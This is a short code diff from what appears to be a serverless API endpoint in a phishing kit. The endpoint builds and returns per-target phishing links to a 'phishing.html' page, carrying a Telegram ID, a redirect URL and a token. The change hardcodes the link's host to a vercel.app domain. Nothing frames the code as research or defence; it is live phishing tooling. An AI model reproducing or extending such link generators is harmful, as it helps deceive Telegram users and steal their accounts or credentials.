@@ -15,7 +15,7 @@ export default async (req, res) => {
     // In a real implementation, store { token, telegramId, redirectUrl, expiry }
     // in a database like Vercel KV, Supabase, or MongoDB
     
-    const phishingUrl = `${process.env.VERCEL_URL}/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
+    const phishingUrl = `https://opaslabs.vercel.app/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
     
     res.status(200).json({ link: phishingUrl });
     
